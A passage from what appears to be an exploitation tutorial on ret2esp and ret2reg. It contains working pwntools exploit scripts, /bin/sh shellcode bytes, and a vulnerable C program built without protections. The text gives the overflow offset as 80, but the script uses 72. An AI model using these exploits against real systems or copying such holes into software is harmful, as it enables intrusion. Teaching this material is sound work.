  \ Pointer) always points to the top of the stack**, this technique involves replacing the EIP (Instruction Pointer) with\
  \ the address of a **`jmp esp`** or **`call esp`** instruction. By doing this, the shellcode is placed right after the overwritten\
  \ EIP. When the `ret` instruction executes, ESP points to the next address, precisely where the shellcode is stored.\n\n\
  If **Address Space Layout Randomization (ASLR)** is not enabled in Windows or Linux, it's possible to use `jmp esp` or `call\
  \ esp` instructions found in shared libraries. However, with [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html)\
  \ active, one might need to look within the vulnerable program itself for these instructions (and you might need to defeat\
  \ [**PIE**](../common-binary-protections-and-bypasses/pie/index.html)).\n\nMoreover, being able to place the shellcode **after\
  \ the EIP corruption**, rather than in the middle of the stack, ensures that any `push` or `pop` instructions executed during\
  \ the function's operation don't interfere with the shellcode. This interference could happen if the shellcode were placed\
  \ in the middle of the function's stack.\n\n### Lacking space\n\nIf you are lacking space to write after overwriting RIP\
  \ (maybe just a few bytes), write an initial **`jmp`** shellcode like:\n\n```armasm\nsub rsp, 0x30\njmp rsp\n```\n\nAnd\
  \ write the shellcode early in the stack.\n\n### Finding `jmp/call esp/rsp` gadgets\n\nOn modern challenges it is common\
  \ to automate this search first and only then start placing shellcode. Some practical options are:\n\n```python\nfrom pwn\
  \ import *\n\nelf = ELF('./vuln')\nrop = ROP(elf)\n\nprint(rop.jmp_esp)  # i386\nprint(rop.jmp_rsp)  # amd64\n```\n\n`pwntools`\
  \ will also discard gadgets whose **address contains badchars**, which is useful when the instruction exists but cannot\
  \ be used directly from the overflow.\n\nYou can also search more aggressively with `ROPgadget` because sometimes the binary\
  \ does not contain a clean disassembled `jmp rsp`, but it still contains the raw opcode bytes inside some other executable\
  \ instruction stream:\n\n```bash\nROPgadget --binary ./vuln --re \"jmp|call\" | grep -Ei \"(esp|rsp)\"\nROPgadget --binary\
  \ ./vuln --opcode ffe4   # jmp esp / jmp rsp\nROPgadget --binary ./vuln --opcode ffd4   # call esp / call rsp\n```\n\nThis\
  \ is especially useful in amd64 because the opcode for **`jmp rsp`** is just **`ff e4`**, so any executable byte sequence\
  \ with those bytes can become a valid landing point.\n\n### Example\n\nYou can find an example of this technique in [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)\
  \ with a final exploit like:\n\n```python\nfrom pwn import *\n\nelf = context.binary = ELF('./vuln')\np = process()\n\n\
  jmp_rsp = next(elf.search(asm('jmp rsp')))\n\npayload = b'A' * 120\npayload += p64(jmp_rsp)\npayload += asm('''\n    sub\
  \ rsp, 10;\n    jmp rsp;\n''')\n\npause()\np.sendlineafter('RSP!\\n', payload)\np.interactive()\n```\n\nYou can see another\
  \ example of this technique in [https://guyinatuxedo.github.io/17-stack_pivot/xctf16_b0verflow/index.html](https://guyinatuxedo.github.io/17-stack_pivot/xctf16_b0verflow/index.html).\
  \ There is a buffer overflow without NX enabled. The exploit uses a gadget to **reduce the address of `$esp`** and then\
  \ a `jmp esp;` to jump to the shellcode:\n\n```python\n# From https://guyinatuxedo.github.io/17-stack_pivot/xctf16_b0verflow/index.html\n\
  from pwn import *\n\n# Establish the target process\ntarget = process('./b0verflow')\n#gdb.attach(target, gdbscript = 'b\
  \ *0x080485a0')\n\n# The shellcode we will use\n# I did not write this, it is from: http://shell-storm.org/shellcode/files/shellcode-827.php\n\
  shellcode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\\
  xcd\\x80\"\n\n# Establish our rop gadgets\n\n# 0x08048504 : jmp esp\njmpEsp = p32(0x08048504)\n\n# 0x080484fd : push ebp\
  \ ; mov ebp, esp ; sub esp, 0x24 ; ret\npivot = p32(0x80484fd)\n\n# Make the payload\n\npayload = \"\"\npayload += jmpEsp\
  \ # Our jmp esp gadget\npayload += shellcode # Our shellcode\npayload += \"1\"*(0x20 - len(shellcode)) # Filler between\
  \ end of shellcode and saved return address\npayload += pivot # Our pivot gadget\n\n# Send our payload\ntarget.sendline(payload)\n\
  \n# Drop to an interactive shell\ntarget.interactive()\n```\n\n## Ret2reg\n\nSimilarly, if we know a function returns the\
  \ address where the shellcode is stored, we can leverage **`call eax`** or **`jmp eax`** instructions (known as **ret2eax**\
  \ technique), offering another method to execute our shellcode. Just like eax, **any other register** containing an interesting\
  \ address could be used (**ret2reg**).\n\nTypical cases are functions returning the destination buffer in the return-value\
  \ register, or code paths that keep a pointer to the attacker-controlled buffer in some argument/scratch register until\
  \ the vulnerable `ret`.\n\n### Hunting the register jump\n\nOn x86/x64 you usually search for **`jmp reg`** or **`call reg`**\
  \ targeting the register that points to your bytes:\n\n```bash\nROPgadget --binary ./vuln --re \"jmp|call\" | grep -Ei \"\
  (eax|ebx|ecx|edx|esi|edi|esp|rax|rbx|rcx|rdx|rsi|rdi|rsp)\"\n```\n\nOn ARM64 the same idea applies, but you are normally\
  \ looking for **`br xN`** or **`blr xN`** gadgets instead:\n\n```bash\nROPgadget --binary ./vuln --only \"br|blr\"\n```\n\
  \nIf the binary is protected with badchar restrictions, remember that the **gadget address** matters as much as the gadget\
  \ mnemonic. A perfect `jmp rax` is useless if the address cannot be injected intact.\n\n### Example\n\nYou can find some\
  \ examples here:\n\n- [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg)\n\
  - [https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/ret2eax.c](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/ret2eax.c)\n\
  \  - **`strcpy`** stores in **`eax`** the address of the buffer where the shellcode was stored and **`eax`** is not overwritten,\
  \ so it is possible to use a `ret2eax`.\n\n## ARM64\n\n### Ret2sp\n\nIn ARM64 there **aren't** instructions allowing to\
  \ **jump directly to the SP register**. It might be possible to find a gadget that **moves sp to a register and then jumps\
  \ to that register**, but in the libc of my kali I couldn't find any gadget like that:\n\n```bash\nfor i in `seq 1 30`;\
  \ do\n    ROPgadget --binary /usr/lib/aarch64-linux-gnu/libc.so.6 | grep -Ei \"[mov|add] x${i}, sp.* ; b[a-z]* x${i}( |$)\"\
  ;\ndone\n```\n\nThe only ones I discovered would change the value of the register where sp was copied before jumping to\
  \ it (so it would become useless):\n\n<figure><img src=\"../../images/image (1224).png\" alt=\"\"><figcaption></figcaption></figure>\n\
  \n### Ret2reg\n\nIf a register has an interesting address it's possible to jump to it just finding the adequate instruction.\
  \ You could use something like:\n\n```bash\nROPgadget --binary /usr/lib/aarch64-linux-gnu/libc.so.6 | grep -Ei \" b[a-z]*\
  \ x[0-9][0-9]?\";\n```\n\nIn ARM64, it's **`x0`** who stores the return value of a function, so it could be that x0 stores\
  \ the address of a buffer controlled by the user with a shellcode to execute.\n\nExample code:\n\n```c\n// clang -o ret2x0\
  \ ret2x0.c -no-pie -fno-stack-protector -Wno-format-security -z execstack\n\n#include <stdio.h>\n#include <string.h>\n\n\
  void do_stuff(int do_arg){\n    if (do_arg == 1)\n        __asm__(\"br x0\");\n    return;\n}\n\nchar* vulnerable_function()\
  \ {\n    char buffer[64];\n    fgets(buffer, sizeof(buffer)*3, stdin);\n    return buffer;\n}\n\nint main(int argc, char\
  \ **argv) {\n    char* b = vulnerable_function();\n    do_stuff(2);\n    return 0;\n}\n```\n\nChecking the disassembly of\
  \ the function it's possible to see that the **address to the buffer** (vulnerable to bof and **controlled by the user**)\
  \ is **stored in `x0`** before returning from the buffer overflow:\n\n<figure><img src=\"../../images/image (1225).png\"\
  \ alt=\"\" width=\"563\"><figcaption></figcaption></figure>\n\nIt's also possible to find the gadget **`br x0`** in the\
  \ **`do_stuff`** function:\n\n<figure><img src=\"../../images/image (1226).png\" alt=\"\" width=\"563\"><figcaption></figcaption></figure>\n\
  \nWe will use that gadget to jump to it because the binary is compiled **WITHOUT PIE.** Using a pattern it's possible to\
  \ see that the **offset of the buffer overflow is 80**, so the exploit would be:\n\n```python\nfrom pwn import *\n\np =\
  \ process('./ret2x0')\nelf = context.binary = ELF('./ret2x0')\n\nstack_offset = 72\nshellcode = asm(shellcraft.sh())\nbr_x0\
  \ = p64(0x4006a0) # Addr of: br x0;\npayload = shellcode + b\"A\" * (stack_offset - len(shellcode)) + br_x0\n\np.sendline(payload)\n\
  p.interactive()\n```\n\n> [!WARNING]\n> If instead of `fgets` it was used something like **`read`**, it would have been\
  \ possible to bypass PIE also by **only overwriting the last 2 bytes of the return address** to return to the `br x0;` instruction\
  \ without needing to know the complete address.\\\n> With `fgets` it doesn't work because it **adds a null (0x00) byte at\
  \ the end**.\n\n## Protections\n\n- [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md): If the target memory\
  \ is not executable, **ret2esp/ret2reg only gives you control-flow redirection**, not code execution. In modern exploits\
  \ this is often combined with a previous `mprotect`/`VirtualProtect`-style stage or with already executable memory.\n- [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html)\
  \ & [**PIE**](../common-binary-protections-and-bypasses/pie/index.html): These make it harder to know the address of the\
  \ final `jmp/call <reg>` gadget. Partial overwrites may still work when the gadget is close enough to the original return\
  \ address.\n- [**CET / Shadow Stack**](../common-binary-protections-and-bypasses/cet-and-shadow-stack.md): On x86_64, classic\
  \ ret-based entry into `jmp esp` / `jmp rsp` / `jmp reg` gadgets becomes unreliable because the corrupted return address\
  \ is checked against the hardware shadow stack before the gadget is reached.\n- **ARM64 PAC/BTI**: Pointer Authentication\
  \ can break the classic saved-LR overwrite path, and Branch Target Identification means `br xN` jumps are expected to land\
  \ on a valid BTI landing pad (`bti j` / `bti jc`). A `br xN` gadget may exist but still fault on hardened binaries if the\
  \ destination bytes are not a valid indirect-branch target.\n\n## References\n\n- [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode)\n\
